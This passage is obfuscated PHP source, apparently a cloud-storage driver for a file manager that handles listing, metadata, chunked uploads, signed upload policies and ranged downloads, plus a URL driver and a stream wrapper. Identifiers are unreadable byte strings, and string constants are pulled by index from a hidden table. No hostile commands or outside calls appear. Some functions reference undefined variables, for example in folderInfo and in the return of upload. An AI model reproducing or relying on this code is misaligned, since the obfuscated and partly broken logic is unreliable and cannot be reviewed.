$íò¦Œ‰ê =& $_SERVER[ŒÅŸ‹ä†]; return substr_count($İÑ•çÈ¡, $íò¦Œ‰ê[8]) - substr_count($±§Æ˜Éş, $íò¦Œ‰ê[8]); }); foreach ($€Î¼ÖĞÖ as $úˆùÎ…é) { $ì¥õÒ·Æ = $this->ussRequest($úˆùÎ…é, $¢òî×Ëû[1716]); if (!$ì¥õÒ·Æ[$¢òî×Ëû[1344]]) { return !1; } } $ì¥õÒ·Æ = $this->ussRequest($ƒ‹Æ§ãÃ, $¢òî×Ëû[1716]); return $ì¥õÒ·Æ[$¢òî×Ëû[1344]]; } public function rename($ˆ±ìèÙâ, $ÉîÅ±…) { if ($this->isFile($ˆ±ìèÙâ)) { $ÉîÅ±… = get_path_father($ˆ±ìèÙâ) . $ÉîÅ±…; return $this->moveFile($ˆ±ìèÙâ, $ÉîÅ±…); } return $this->renameObject($ˆ±ìèÙâ, $ÉîÅ±…); } public function fileInfo($ËŞéÂ¼™, $òÙ¾Â·· = false, $ƒ²Àæ´· = array()) { $¿ïÛÚÙ˜ =& $_SERVER[ŒÅŸ‹ä†]; $‚Ó×Ã© = array($¿ïÛÚÙ˜[42] => $this->pathThis($ËŞéÂ¼™), $¿ïÛÚÙ˜[97] => $this->getPathOuter($¿ïÛÚÙ˜[8] . $ËŞéÂ¼™), $¿ïÛÚÙ˜[43] => $¿ïÛÚÙ˜[241], $¿ïÛÚÙ˜[89] => isset($ƒ²Àæ´·[$¿ïÛÚÙ˜[89]]) ? $ƒ²Àæ´·[$¿ïÛÚÙ˜[89]] : 0, $¿ïÛÚÙ˜[177] => $this->ext($ËŞéÂ¼™)); if ($òÙ¾Â··) { return $‚Ó×Ã©; } $‚Ó×Ã©[$¿ïÛÚÙ˜[242]] = $‚Ó×Ã©[$¿ïÛÚÙ˜[98]] = 0; $‚Ó×Ã©[$¿ïÛÚÙ˜[243]] = $‚Ó×Ã©[$¿ïÛÚÙ˜[244]] = !0; if (empty($ƒ²Àæ´·)) { $ƒ²Àæ´· = $this->objectMeta($ËŞéÂ¼™); if (!$ƒ²Àæ´·) { return $‚Ó×Ã©; } } $‚Ó×Ã©[$¿ïÛÚÙ˜[242]] = intval($ƒ²Àæ´·[$¿ïÛÚÙ˜[1717]]); $‚Ó×Ã©[$¿ïÛÚÙ˜[98]] = intval($ƒ²Àæ´·[$¿ïÛÚÙ˜[1718]]); $‚Ó×Ã©[$¿ïÛÚÙ˜[89]] = $ƒ²Àæ´·[$¿ïÛÚÙ˜[89]]; return $‚Ó×Ã©; } public function folderInfo($¤‘¼ûŒ, $·ã“Ú’˜ = false) { $‡–ığùï =& $_SERVER[ŒÅŸ‹ä†]; $ìÍå²ï‚ = array($‡–ığùï[42] => $this->pathThis($¤‘¼ûŒ), $‡–ığùï[97] => $this->getPathOuter($‡–ığùï[8] . $¤‘¼ûŒ), $‡–ığùï[43] => $‡–ığùï[88]); if ($·ã“Ú’˜) { return $ìÍå²ï‚; } $ìÍå²ï‚[$‡–ığùï[242]] = $ìÍå²ï‚[$‡–ığùï[98]] = 0; $ìÍå²ï‚[$‡–ığùï[243]] = $ìÍå²ï‚[$‡–ığùï[244]] = !0; if (empty($š¾Ê¹ÍŒ)) { $š¾Ê¹ÍŒ = $this->objectMeta($¤‘¼ûŒ); if (!$š¾Ê¹ÍŒ) { return $ìÍå²ï‚; } } $ìÍå²ï‚[$‡–ığùï[242]] = intval($š¾Ê¹ÍŒ[$‡–ığùï[1717]]); $ìÍå²ï‚[$‡–ığùï[98]] = intval($š¾Ê¹ÍŒ[$‡–ığùï[1718]]); return $ìÍå²ï‚; } private function listObjs($¼×ç‹ƒ‘, $îÕ„Ãø½ = 0, $ıã“Ò›é = 1000) { $ÄÀ†³²¤ =& $_SERVER[ŒÅŸ‹ä†]; $©•´Ü½¬ = array($ÄÀ†³²¤[1719], $ÄÀ†³²¤[1720] . $ıã“Ò›é); if ($îÕ„Ãø½) { $©•´Ü½¬[] = $ÄÀ†³²¤[1721] . $îÕ„Ãø½; } $•°øíà¢ = $this->ussRequest($¼×ç‹ƒ‘, $ÄÀ†³²¤[1550], !1, $©•´Ü½¬); return !$•°øíà¢[$ÄÀ†³²¤[1344]] ? !1 : $•°øíà¢[$ÄÀ†³²¤[1334]]; } private function fileList($¿ı¼©ª—, &$¼«ªÈ£İ, &$ÉÑû¬›€, $É…Ç¦ = false) { $§à‡Ë†Ê =& $_SERVER[ŒÅŸ‹ä†]; $ŞÀÃ“öã = $§à‡Ë†Ê[12]; $ÃÅ¯½ˆó = 1000; $ù¯ãè¶× = rtrim($¿ı¼©ª—, $§à‡Ë†Ê[8]) . $§à‡Ë†Ê[8]; while (!0) { check_abort(); $ë—•Û”Ç = $this->listObjs($¿ı¼©ª—, $ŞÀÃ“öã, $ÃÅ¯½ˆó); if (!$ë—•Û”Ç) { return !1; } $ŞÀÃ“öã = isset($ë—•Û”Ç[$§à‡Ë†Ê[1722]]) ? $ë—•Û”Ç[$§à‡Ë†Ê[1722]] : $§à‡Ë†Ê[12]; $¾â°¢ØÕ = isset($ë—•Û”Ç[$§à‡Ë†Ê[1723]]) ? $ë—•Û”Ç[$§à‡Ë†Ê[1723]] : array(); foreach ($¾â°¢ØÕ as $×‹†ø«) { $¢ˆ„Éìİ = $×‹†ø«[$§à‡Ë†Ê[43]] == $§à‡Ë†Ê[88] ? !0 : !1; $ÑôèïëÖ = ltrim($ù¯ãè¶× . $×‹†ø«[$§à‡Ë†Ê[42]], $§à‡Ë†Ê[8]) . ($¢ˆ„Éìİ ? $§à‡Ë†Ê[8] : $§à‡Ë†Ê[12]); $‹ÆÌƒçÓ = array($§à‡Ë†Ê[42] => $ÑôèïëÖ, $§à‡Ë†Ê[43] => $¢ˆ„Éìİ ? $§à‡Ë†Ê[88] : $§à‡Ë†Ê[241], $§à‡Ë†Ê[89] => $×‹†ø«[$§à‡Ë†Ê[422]], $§à‡Ë†Ê[1718] => $×‹†ø«[$§à‡Ë†Ê[1724]]); $this->cacheMethodInfoSet($ÑôèïëÖ, $¢ˆ„Éìİ, $‹ÆÌƒçÓ); if ($¢ˆ„Éìİ) { $¼«ªÈ£İ[] = $ÑôèïëÖ; if ($É…Ç¦) { $this->fileList($ÑôèïëÖ, $¼«ªÈ£İ, $ÉÑû¬›€, $É…Ç¦); } continue; } $ÉÑû¬›€[] = $‹ÆÌƒçÓ; } if (count($¾â°¢ØÕ) < $ÃÅ¯½ˆó) { break; } } $this->cacheMethodInfoSet($¿ı¼©ª—, !0); } public function listPath($é»„Ä¬«, $œî£”Ë³ = false) { $…Ù±¼…À =& $_SERVER[ŒÅŸ‹ä†]; $³şÚ“û“ = $—õæÃîà = array(); $this->fileList($é»„Ä¬«, $³şÚ“û“, $—õæÃîà); foreach ($³şÚ“û“ as $ü‚ÁåĞÃ => $Ë¶íœ¹ã) { $³şÚ“û“[$ü‚ÁåĞÃ] = $this->folderInfo($Ë¶íœ¹ã, $œî£”Ë³); } foreach ($—õæÃîà as $ü‚ÁåĞÃ => $Ë¶íœ¹ã) { $—õæÃîà[$ü‚ÁåĞÃ] = $this->fileInfo($Ë¶íœ¹ã[$…Ù±¼…À[42]], $œî£”Ë³, $Ë¶íœ¹ã); } return array($…Ù±¼…À[95] => $³şÚ“û“, $…Ù±¼…À[96] => $—õæÃîà); } public function has($É´ò‚öã, $”½°Ëï = false, $ÙÊÆŠõ = true) { $å€âÅ© =& $_SERVER[ŒÅŸ‹ä†]; $ıœŸ‹ë = $å€âÅ©[12]; $Ó¨‰ÃşŒ = 500; $êß­«èó = 0; $„†Šåûê = 0; $ÀôË÷‚ò = rtrim($É´ò‚öã, $å€âÅ©[8]) . $å€âÅ©[8]; while (!0) { check_abort(); $¼µÚÌì³ = $this->listObjs($É´ò‚öã, $ıœŸ‹ë, $Ó¨‰ÃşŒ); if (!$¼µÚÌì³) { return !1; } $ıœŸ‹ë = isset($¼µÚÌì³[$å€âÅ©[1722]]) ? $¼µÚÌì³[$å€âÅ©[1722]] : $å€âÅ©[12]; $ëïï“ŠÛ = isset($¼µÚÌì³[$å€âÅ©[1723]]) ? $¼µÚÌì³[$å€âÅ©[1723]] : array(); if (empty($ëïï“ŠÛ)) { break; } $Û¬ô¥‰Ñ = array_filter($ëïï“ŠÛ, function ($÷˜Ä‹ç”) { $ŸŒœãË =& $_SERVER[ŒÅŸ‹ä†]; return $÷˜Ä‹ç”[$ŸŒœãË[43]] == $ŸŒœãË[88]; }); $¸©õ¦è½ = count($ëïï“ŠÛ); $Û¬ô¥‰Ñ = count($Û¬ô¥‰Ñ); $Ç£ÎïåŒ = $¸©õ¦è½ - $Û¬ô¥‰Ñ; if ($”½°Ëï) { $„†Šåûê += $Û¬ô¥‰Ñ; $êß­«èó += $Ç£ÎïåŒ; if ($¸©õ¦è½ < $Ó¨‰ÃşŒ) { break; } continue; } if ($ÙÊÆŠõ) { if ($Ç£ÎïåŒ) { return !0; } } else { if ($Û¬ô¥‰Ñ) { return !0; } } if ($¸©õ¦è½ < $Ó¨‰ÃşŒ) { break; } } if ($”½°Ëï) { return array($å€âÅ©[250] => $êß­«èó, $å€âÅ©[251] => $„†Šåûê); } return !1; } public function listAll($Æ“¬³í¤) { $³¾„ĞÂ† =& $_SERVER[ŒÅŸ‹ä†]; $ò©Š®ü = $Üâşª‚Ÿ = array(); $this->fileList($Æ“¬³í¤, $ò©Š®ü, $Üâşª‚Ÿ, !0); $ŸÑ¨º» = array_to_keyvalue($Üâşª‚Ÿ, $³¾„ĞÂ†[42]); foreach ($ò©Š®ü as $›–Ä“›) { if (is_string($›–Ä“›)) { $ŸÑ¨º»[$›–Ä“›] = array($³¾„ĞÂ†[89] => 0); } } return $this->listAllFiles($Æ“¬³í¤, $ŸÑ¨º»); } public function canRead($ïÛºŒã) { return $this->exist($ïÛºŒã) ? !0 : !1; } public function canWrite($Ö‚”€øÍ) { return $this->exist($Ö‚”€øÍ) ? !0 : !1; } public function getContent($©¹Âêô£) { return $this->fileSubstr($©¹Âêô£, 0, -1); } public function setContent($ú€Š¯Î, $ÖÁ€ş‹Á = '') { $İ¨Ú¡Éì =& $_SERVER[ŒÅŸ‹ä†]; if (!$ÖÁ€ş‹Á) { $µ Øì§á = $this->ussRequest($ú€Š¯Î, $İ¨Ú¡Éì[298]); return $µ Øì§á[$İ¨Ú¡Éì[1344]]; } $í¥±±‚© = $this->tempFile($this->pathThis($ú€Š¯Î)); file_put_contents($í¥±±‚©, $ÖÁ€ş‹Á); if ($this->upload($ú€Š¯Î, $í¥±±‚©)) { $this->tempFileRemve($í¥±±‚©); return !0; } return !1; } public function fileSubstr($å©òï‰¦, $À´ıÃÏ, $§ÀÃªı) { $†æö»’« =& $_SERVER[ŒÅŸ‹ä†]; if (!($¢£éø¿ü = $this->link($å©òï‰¦))) { return !1; } $üèëéÖ• = !1; if ($§ÀÃªı > 0) { $‚áô½ª¡ = $À´ıÃÏ + $§ÀÃªı - 1; $üèëéÖ• = array($†æö»’«[1549] . $À´ıÃÏ . $†æö»’«[482] . $‚áô½ª¡); } $¼±æ„Éƒ = url_request($¢£éø¿ü, $†æö»’«[1550], !1, $üèëéÖ•); return $¼±æ„Éƒ[$†æö»’«[846]] ? $¼±æ„Éƒ[$†æö»’«[1334]] : !1; } public function upload($òà˜©¯², $¢ÚùºÌ€, $Ó“ºÄÑ = false, $šÍÊÏÉ• = REPEAT_REPLACE) { $°ì°†ª =& $_SERVER[ŒÅŸ‹ä†]; $úÔÍ¡‰õ = IO::size($¢ÚùºÌ€); if ($úÔÍ¡‰õ <= 1024 * 1024 * 200) { $®„Ë«Òì = array($°ì°†ª[1725] . $¢ÚùºÌ€); $¸ŸÜê = $this->ussRequest($òà˜©¯², $°ì°†ª[264], $®„Ë«Òì); return $¸ŸÜê[$°ì°†ª[1344]] ? $this->getPathOuter($òà˜©¯²) : !1; } $œúÚ®¸ó = 1024 * 1024 * 10; $ç½Ù“±º = array($°ì°†ª[1726], $°ì°†ª[1727] . $úÔÍ¡‰õ, $°ì°†ª[1728], $°ì°†ª[1729] . $œúÚ®¸ó); $¸ŸÜê = $this->ussRequest($òà˜©¯², $°ì°†ª[264], !1, $ç½Ù“±º); if (!$¸ŸÜê[$°ì°†ª[1344]]) { return !1; } $èÖÛ‡¨‰ = $¸ŸÜê[$°ì°†ª[1334]]; $ó¤«´º© = 0; $Ö£À‚Ä½ = $èÖÛ‡¨‰[$°ì°†ª[1730]]; $Öäœ«™Š = fopen($¢ÚùºÌ€, $°ì°†ª[1610]); if (!$Öäœ«™Š) { return !1; } do { $‹ºÍ© = $èÖÛ‡¨‰[$°ì°†ª[1731]]; fseek_64($Öäœ«™Š, $ó¤«´º©); $¨éÔéÔ = fread($Öäœ«™Š, $‹ºÍ©); $ÍÊë„ê = 0; do { $ÍÊë„ê++; $èÖÛ‡¨‰ = $this->uploadPart($òà˜©¯², $èÖÛ‡¨‰, $¨éÔéÔ); } while (!$èÖÛ‡¨‰ && $ÍÊë„ê < 3); if (!$èÖÛ‡¨‰) { return !1; } $Ö£À‚Ä½ = $èÖÛ‡¨‰[$°ì°†ª[1730]]; $ó¤«´º© += $‹ºÍ©; } while ($Ö£À‚Ä½ != -1); fclose($Öäœ«™Š); $ç½Ù“±º = array($°ì°†ª[1732], $°ì°†ª[1733] . $èÖÛ‡¨‰[$°ì°†ª[1734]], $°ì°†ª[1728]); $¸ŸÜê = $this->ussRequest($òà˜©¯², $°ì°†ª[264], !1, $ç½Ù“±º); return $¸ŸÜê[$°ì°†ª[1344]] ? $this->getPathOuter($ø®ÒÛ›) : !1; } private function uploadPart($ÍÁ‰î´™, $ˆÖ°âªÈ, &$…Ñğ·Ÿø) { $ç¬íÊÀº =& $_SERVER[ŒÅŸ‹ä†]; $ç£æ¼ç = array($ç¬íÊÀº[1735], $ç¬íÊÀº[1733] . $ˆÖ°âªÈ[$ç¬íÊÀº[1734]], $ç¬íÊÀº[1736] . $ˆÖ°âªÈ[$ç¬íÊÀº[1730]], $ç¬íÊÀº[154] . $ˆÖ°âªÈ[$ç¬íÊÀº[1731]]); $îŠ­ûÔğ = $this->ussRequest($ÍÁ‰î´™, $ç¬íÊÀº[264], $…Ñğ·Ÿø, $ç£æ¼ç); return !$îŠ­ûÔğ[$ç¬íÊÀº[1344]] ? $îŠ­ûÔğ[$ç¬íÊÀº[1344]] : $îŠ­ûÔğ[$ç¬íÊÀº[1334]]; } public function uploadFormData($ñğøá‹Š, $¯à¼†Üª = 3600) { return $this->uploadPolicy($ñğøá‹Š, $¯à¼†Üª); } public function uploadMultiData($ÙûéáÙÑ, $ñ«öÑÏì = 3600) { $Úù”µ£ =& $_SERVER[ŒÅŸ‹ä†]; $Ÿ©€Öˆç = (int) $GLOBALS[$Úù”µ£[7]][$Úù”µ£[89]]; return $this->uploadPolicy($ÙûéáÙÑ, $ñ«öÑÏì, $Ÿ©€Öˆç); } private function uploadPolicy($òûñà¼à, $éóãƒš = 3600, $ğğƒÓÆæ = 0) { $®Ùù»¤ü =& $_SERVER[ŒÅŸ‹ä†]; $ªğ«¨ş¤ = $®Ùù»¤ü[8] . $this->bucket; $‘çÖÖ¯Ó = gmdate($®Ùù»¤ü[1645]); $ØË¹ŒÇ” = array($®Ùù»¤ü[1737] => $this->bucket, $®Ùù»¤ü[1738] => $òûñà¼à, $®Ùù»¤ü[1739] => time() + $éóãƒš, $®Ùù»¤ü[1740] => $‘çÖÖ¯Ó); if ($ğğƒÓÆæ) { $ØË¹ŒÇ”[$®Ùù»¤ü[1630]] = $ğğƒÓÆæ; } $¥“ò’Üó = base64_encode(json_encode($ØË¹ŒÇ”)); $ëùşÓ‡¹ = base64_encode(hash_hmac($®Ùù»¤ü[1694], "\x50\117\x53\x54\x26{$ªğ«¨ş¤}\x26{$‘çÖÖ¯Ó}\46{$¥“ò’Üó}", md5("{$this->userpass}"), !0)); $¢£¯¼ÁË = array($®Ùù»¤ü[288] => $¥“ò’Üó, $®Ùù»¤ü[1741] => "\x55\x50\131\125\x4e\x20{$this->username}\x3a{$ëùşÓ‡¹}", $®Ùù»¤ü[217] => $this->endpoint . $ªğ«¨ş¤); return $¢£¯¼ÁË; } public function download($ÙÇ¤šÀ, $ª¦‹¾€ï) { $”ı«¡‡Î = IO::getPathInner(IO::mkfile($ª¦‹¾€ï)); if (!($Æéèºòˆ = $this->link($ÙÇ¤šÀ))) { return !1; } $¶ÔÓ‡³ô = 0; $ïÂïÜÁ¬ = 1024 * 200; $Å€ñ×Àä = fopen($”ı«¡‡Î, $_SERVER[ŒÅŸ‹ä†][1689]); while (!0) { $×£ğ³Ö¿ = $this->fileSubstr($ÙÇ¤šÀ, $¶ÔÓ‡³ô, $ïÂïÜÁ¬); if ($×£ğ³Ö¿ === !1) { return !1; } fwrite($Å€ñ×Àä, $×£ğ³Ö¿); $¶ÔÓ‡³ô += $ïÂïÜÁ¬; if (strlen($×£ğ³Ö¿) < $ïÂïÜÁ¬) { break; } } fclose($Å€ñ×Àä); return $ª¦‹¾€ï; } public function link($éæÔÌï‘, $¸Š£ğ²ª = array()) { $“íØúİ¹ =& $_SERVER[ŒÅŸ‹ä†]; $éæÔÌï‘ = trim($éæÔÌï‘, $“íØúİ¹[8]); if (!empty($this->token)) { $£®¦‚Ïâ = strtotime(date($“íØúİ¹[1742])); $ğ·¾¼¡ = substr(md5($this->token . $“íØúİ¹[295] . $£®¦‚Ïâ . $“íØúİ¹[1743] . $éæÔÌï‘), 12, 8) . $£®¦‚Ïâ; $¸Š£ğ²ª[] = $“íØúİ¹[1744] . $ğ·¾¼¡; } $ÍÙ‹é„ = !empty($¸Š£ğ²ª) ? $“íØúİ¹[86] . implode($“íØúİ¹[295], $¸Š£ğ²ª) : $“íØúİ¹[12]; return $this->getHost() . $“íØúİ¹[8] . $this->pathEncode($éæÔÌï‘) . $ÍÙ‹é„; } public function fileOut($ËÛŒ±, $Í¶Œˆ¹á = false, $Â¼¥¥¸» = false, $Ü¸§àÃ‚ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ËÛŒ±, $Í¶Œˆ¹á, $Â¼¥¥¸», $Ü¸§àÃ‚); } if (!$Â¼¥¥¸») { $Â¼¥¥¸» = $this->pathThis($ËÛŒ±); } $™ÕÊ” = $Í¶Œˆ¹á ? array($_SERVER[ŒÅŸ‹ä†][1745] . rawurlencode($Â¼¥¥¸»)) : array(); $‹Á¼±®ô = $this->link($ËÛŒ±, $™ÕÊ”); $this->fileOutLink($‹Á¼±®ô); } public function fileOutServer($¯Š†•Î, $ÊÍ””×ª = false, $èüÁ±ä = false, $óĞÊÍÉ = '') { parent::fileOut($¯Š†•Î, $ÊÍ””×ª, $èüÁ±ä, $óĞÊÍÉ); } public function fileOutImage($ñ«Îì“, $Çñ¹Ô™ = 250) { $¥»ç¢Çô = $this->link($ñ«Îì“ . $_SERVER[ŒÅŸ‹ä†][1746] . $Çñ¹Ô™); $this->fileOutLink($¥»ç¢Çô); } public function fileOutImageServer($ÒíÍù¼, $”ş¶üº = 250) { parent::fileOutImage($ÒíÍù¼, $”ş¶üº); } public function hashMd5($Š‰î¸) { $²¿˜Õöâ =& $_SERVER[ŒÅŸ‹ä†]; $øÑáÚ ó = $this->_objectMeta($Š‰î¸); return isset($øÑáÚ ó[$²¿˜Õöâ[256]]) ? $øÑáÚ ó[$²¿˜Õöâ[256]] : !1; } public function size($Ğ™İå±¾) { $õ°ÃÈØØ = $this->objectMeta($Ğ™İå±¾); return $õ°ÃÈØØ ? $õ°ÃÈØØ[$_SERVER[ŒÅŸ‹ä†][89]] : 0; } public function info($·šƒ›ê«) { if ($this->isFolder($·šƒ›ê«)) { return $this->folderInfo($·šƒ›ê«); } else { if ($this->isFile($·šƒ›ê«)) { return $this->fileInfo($·šƒ›ê«); } } return !1; } public function exist($«–¢ä‡É) { return $this->isFile($«–¢ä‡É) || $this->isFolder($«–¢ä‡É); } public function isFile($‰Ÿğ¹µ«) { return !$this->isFolder($‰Ÿğ¹µ«) && $this->objectMeta($‰Ÿğ¹µ«); } public function isFolder($«”…ş) { return $this->cacheMethod($_SERVER[ŒÅŸ‹ä†][188], $«”…ş); } protected function objectMeta($ ¼¡Óı‡) { return $this->cacheMethod($_SERVER[ŒÅŸ‹ä†][190], $ ¼¡Óı‡); } protected function _objectMeta($‡Í¡„î¾) { $ú†–¿† =& $_SERVER[ŒÅŸ‹ä†]; if ($‡Í¡„î¾ == $ú†–¿†[12] || $‡Í¡„î¾ == $ú†–¿†[8]) { return array(); } $ıÔÆÊŸƒ = $this->ussRequest($‡Í¡„î¾, $ú†–¿†[1747]); if (!$ıÔÆÊŸƒ[$ú†–¿†[1344]]) { return null; } $¶ê°©ıÈ = isset($ıÔÆÊŸƒ[$ú†–¿†[1334]]) ? $ıÔÆÊŸƒ[$ú†–¿†[1334]] : array(); if (!isset($¶ê°©ıÈ[$ú†–¿†[1748]])) { return null; } $ƒ²ãíé = array($ú†–¿†[43] => isset($¶ê°©ıÈ[$ú†–¿†[1748]]) ? $¶ê°©ıÈ[$ú†–¿†[1748]] : null, $ú†–¿†[89] => isset($¶ê°©ıÈ[$ú†–¿†[1749]]) ? $¶ê°©ıÈ[$ú†–¿†[1749]] : null, $ú†–¿†[256] => isset($¶ê°©ıÈ[$ú†–¿†[1750]]) ? $¶ê°©ıÈ[$ú†–¿†[1750]] : null, $ú†–¿†[1717] => isset($¶ê°©ıÈ[$ú†–¿†[1751]]) ? $¶ê°©ıÈ[$ú†–¿†[1751]] : null); $ƒ²ãíé[$ú†–¿†[1718]] = isset($¶ê°©ıÈ[$ú†–¿†[1752]]) ? strtotime($¶ê°©ıÈ[$ú†–¿†[1752]]) : $ƒ²ãíé[$ú†–¿†[1717]]; return $ƒ²ãíé; } protected function _isFolder($ñ¹ğ¸¨°) { $½ï´ŸğŞ =& $_SERVER[ŒÅŸ‹ä†]; if ($ñ¹ğ¸¨° == $½ï´ŸğŞ[12] || $ñ¹ğ¸¨° == $½ï´ŸğŞ[8]) { return !0; } $‘ÂÔä®Ø = $this->_objectMeta($ñ¹ğ¸¨°); return isset($‘ÂÔä®Ø[$½ï´ŸğŞ[43]]) && $‘ÂÔä®Ø[$½ï´ŸğŞ[43]] == $½ï´ŸğŞ[88] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ñÉıâÙ­ = false) { } public function exist($÷ô›ÖÌ) { $œıñ½’Ü = $this->info($÷ô›ÖÌ); return $œıñ½’Ü[$_SERVER[ŒÅŸ‹ä†][243]]; } public function isFile($Úƒî¾şÒ) { $—ŒÖşø = $this->info($Úƒî¾şÒ); return $—ŒÖşø[$_SERVER[ŒÅŸ‹ä†][243]]; } public function isFolder($­‘ƒÙÁÌ) { return !1; } public function size($ş¨•ô¿Œ) { $Ö¯Ô™åÒ = $this->info($ş¨•ô¿Œ); return $Ö¯Ô™åÒ[$_SERVER[ŒÅŸ‹ä†][89]]; } public function info($üï’³) { return $this->infoParse($üï’³); } public function infoAuth($–Áëö ) { return $this->infoParse($–Áëö ); } public function infoWithChildren($‰É–») { return $this->infoParse($‰É–»); } public function infoFull($ÄÎ»ŸÛİ) { return $this->infoParse($ÄÎ»ŸÛİ); } private function infoParse($ƒÄÊ–š) { $‹¸À¥ñÜ =& $_SERVER[ŒÅŸ‹ä†]; $ïšÚËã÷ = $this->header($ƒÄÊ–š); if (!$ïšÚËã÷ || !$ïšÚËã÷[$‹¸À¥ñÜ[846]]) { return !1; } $«ÆÈšïÆ = _get($ïšÚËã÷, $‹¸À¥ñÜ[422], 0); $ó¶¡ºÒ˜ = array($‹¸À¥ñÜ[42] => $ïšÚËã÷[$‹¸À¥ñÜ[42]], $‹¸À¥ñÜ[97] => $ƒÄÊ–š, $‹¸À¥ñÜ[43] => $‹¸À¥ñÜ[241], $‹¸À¥ñÜ[89] => intval($«ÆÈšïÆ), $‹¸À¥ñÜ[177] => get_path_ext($ïšÚËã÷[$‹¸À¥ñÜ[42]]), $‹¸À¥ñÜ[1607] => $«ÆÈšïÆ > 0 && $ïšÚËã÷[$‹¸À¥ñÜ[1753]], $‹¸À¥ñÜ[1608] => !1); return $ó¶¡ºÒ˜; } private function header($î­í÷Âª) { $ïã™æïú =& $_SERVER[ŒÅŸ‹ä†]; if (isset(self::$_cacheHeader[$î­í÷Âª])) { return self::$_cacheHeader[$î­í÷Âª]; } $ÔÛåÊõ” = isset($GLOBALS[$ïã™æïú[1754]]) ? $GLOBALS[$ïã™æïú[1754]] : !1; $GLOBALS[$ïã™æïú[1754]] = !0; self::$_cacheHeader[$î­í÷Âª] = url_header($î­í÷Âª); $GLOBALS[$ïã™æïú[1754]] = $ÔÛåÊõ”; return self::$_cacheHeader[$î­í÷Âª]; } public function hashSimple($«ƒçÉŒû, $í½©Ğ  = false) { $‚¯ì£¿¯ =& $_SERVER[ŒÅŸ‹ä†]; $··›é¥ = $this->info($«ƒçÉŒû); if (!$··›é¥ || !$··›é¥[$‚¯ì£¿¯[243]]) { return !1; } $ñÇ¼º¡ = $··›é¥[$‚¯ì£¿¯[89]]; $âæ¶àª© = 200; $©ÈÙˆÀ = 50; if ($ñÇ¼º¡ <= $âæ¶àª© * $©ÈÙˆÀ) { return md5($this->fileSubstr($«ƒçÉŒû, 0, $ñÇ¼º¡)) . $ñÇ¼º¡; } $Ãüış‹š = intval($ñÇ¼º¡ / $©ÈÙˆÀ); $¯³ûËøÎ = $‚¯ì£¿¯[12]; $­ÓüµÀğ = timeFloat(); $¤ÅÜÖ = 15; for ($ñĞ·Á§« = 0; $ñĞ·Á§« < $©ÈÙˆÀ; $ñĞ·Á§«++) { if (timeFloat() - $­ÓüµÀğ > $¤ÅÜÖ) { return !1; } $¥¨ßÍ = $this->fileSubstr($«ƒçÉŒû, $Ãüış‹š * $ñĞ·Á§«, $âæ¶àª©); if (!$¥¨ßÍ) { return !1; } $¯³ûËøÎ .= $¥¨ßÍ; } $¯³ûËøÎ .= $this->fileSubstr($«ƒçÉŒû, $ñÇ¼º¡ - $âæ¶àª©, $âæ¶àª©); return md5($¯³ûËøÎ) . $ñÇ¼º¡; } public function getContent($ÉÓÁ˜¢Ú) { return $this->fileSubstr($ÉÓÁ˜¢Ú); } public function fileSubstr($Üòû‚Ç•, $¸¶ÃÆÕ = 0, $£í—õŒ  = -1) { $°¾Â×–ñ =& $_SERVER[ŒÅŸ‹ä†]; $™¿àòÂß = $this->info($Üòû‚Ç•); if (!$™¿àòÂß || !$™¿àòÂß[$°¾Â×–ñ[243]] && $™¿àòÂß[$°¾Â×–ñ[89]] > 1024 * 1024 * 10) { return !1; } if ($£í—õŒ  === -1) { $£í—õŒ  = $™¿àòÂß[$°¾Â×–ñ[89]]; } if ($£í—õŒ  == 0) { return $°¾Â×–ñ[12]; } $ùœ½¢ûÕ = array($°¾Â×–ñ[1755] . $¸¶ÃÆÕ . $°¾Â×–ñ[886] . ($¸¶ÃÆÕ + $£í—õŒ  - 1)); $ÆØóĞì = url_request($Üòû‚Ç•, $°¾Â×–ñ[1550], !1, $ùœ½¢ûÕ, !1, !1, 30); return $ÆØóĞì[$°¾Â×–ñ[1334]] ? $ÆØóĞì[$°¾Â×–ñ[1334]] : $°¾Â×–ñ[12]; } public function download($¦ÙĞ¢¸, $ˆõô©é) { Downloader::start($¦ÙĞ¢¸, $ˆõô©é); return $ˆõô©é; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ï“ë¶¬Ú, $ ²Ï£Œ² = '') { $this->info = $this->info($ï“ë¶¬Ú); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ŒÅŸ‹ä†][97]]; $this->pathOpen = $ï“ë¶¬Ú; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ï“ë¶¬Ú])) { self::$_chunkBuffer[$ï“ë¶¬Ú] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($–£¹û·) { $ÒüÊéŒ¯ = $this->fileSubstr($this->pose, $–£¹û·); $this->pose += strlen($ÒüÊéŒ¯); return $ÒüÊéŒ¯; } public function stream_tell() { return $this->pose; } public function stream_seek($ÕÉ ğ“†, $Œàòè†Ò) { $¡ƒ«•£Ï =& $_SERVER[ŒÅŸ‹ä†]; if ($Œàòè†Ò == SEEK_SET) { $this->pose = $ÕÉ ğ“†; } else { if ($Œàòè†Ò == SEEK_CUR) { $this->pose += $ÕÉ ğ“†; } else { if ($Œàòè†Ò == SEEK_END) { $this->pose = $this->info[$¡ƒ«•£Ï[89]] + intval($ÕÉ ğ“†); } } } if ($ÕÉ ğ“† < 0) { $this->pose = $this->info[$¡ƒ«•£Ï[89]] + $ÕÉ ğ“†; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ŒÅŸ‹ä†][89]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($«Ò¸ş„Ì, $ÈÍ—¥€º) { $¤û¿Èú =& $_SERVER[ŒÅŸ‹ä†]; $İì²Ú¹Ÿ = $this->info($«Ò¸ş„Ì); return array($¤û¿Èú[1456] => 0, $¤û¿Èú[1756] => 0, $¤û¿Èú[26] => 32768 + 511, $¤û¿Èú[1757] => 0, $¤û¿Èú[1758] => 0, $¤û¿Èú[1759] => 0, $¤û¿Èú[1760] => 0, $¤û¿Èú[89] => $İì²Ú¹Ÿ[$¤û¿Èú[89]], $¤û¿Èú[1761] => $İì²Ú¹Ÿ[$¤û¿Èú[1606]], $¤û¿Èú[1718] => 